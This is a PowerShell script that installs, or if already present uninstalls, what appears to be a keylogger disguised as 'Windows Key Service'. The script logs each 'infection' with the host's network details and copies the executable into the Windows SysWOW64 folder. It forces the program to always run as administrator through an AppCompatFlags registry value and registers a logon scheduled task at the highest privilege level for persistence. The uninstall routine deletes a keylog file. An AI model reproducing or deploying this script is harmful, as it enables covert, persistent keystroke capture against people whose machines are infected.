$BaseDir = "Z:\"
$App = "Windows Key Service"
$AppExe = "$App.exe"
$DestDir = "C:\Windows\SysWOW64\"
$DestIp = "***REMOVED***"
$KeyLogName = "k"
$InstallPath = "$DestDir$AppExe"
$AppCompatFlagsLayers = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers"

$Machine = [Environment]::MachineName
$LogDate = Get-Date -Format "ddMMyyyy-HHmm"
$LogDir = "Z:\Logs\"
$LogFile = "$LogDir$Machine-$LogDate.txt"
$DateTime = Get-Date

function Install()
{
    "Infecting $Machine on $DateTime" | Out-File -Append -FilePath $LogFile

    ipconfig /all | Out-File -Append -FilePath $LogFile

    $IsConnected = Test-Connection -Quiet $DestIp
    if ($IsConnected)
    {
        try {
            # Install
            Copy-Item -Path "$BaseDir$AppExe" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
            
            # Always run application as admin
            New-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Value "~ RUNASADMIN" -PropertyType String -Force | Out-File -Append -FilePath $LogFile

            # Create task in task scheduler
            $action = New-ScheduledTaskAction -Execute $InstallPath
            $trigger = New-ScheduledTaskTrigger -AtLogOn
            $principle = New-ScheduledTaskPrincipal -UserId (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName) -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries
            $task = New-ScheduledTask -Action $action -Principal $principle -Trigger $trigger -Settings $settings
            Register-ScheduledTask $App -InputObject $task
            
            # Start application
            Start-Process -FilePath $InstallPath | Out-File -Append -FilePath $LogFile
        } catch {
            $_.Exception.Message | Out-File -Append -FilePath $LogFile
        }
    }
    else
    {
        "Cannot connect to $DestIp" | Out-File -Append -FilePath $LogFile
    }
}

function Uninstall()
{
    Stop-Process -Name $App -Force
    Remove-Item -Force "$DestDir$KeyLogName"
    Remove-Item $InstallPath | Out-File -Append -FilePath $LogFile
    Remove-ItemProperty -Path $AppCompatFlagsLayers -Name $InstallPath -Force | Out-File -Append -FilePath $LogFile
    Unregister-ScheduledTask -TaskName $App -Confirm:$false | Out-File -Append -FilePath $LogFile
    "Uninstalled $InstallPath" | Out-File -Append -FilePath $LogFile
}


if (!(Test-Path $LogDir))
{
    New-Item -ItemType Directory -Force -Path $LogDir
}

if (Get-Command $InstallPath -ErrorAction SilentlyContinue)
{
    Uninstall
}
else
{
    Install
}
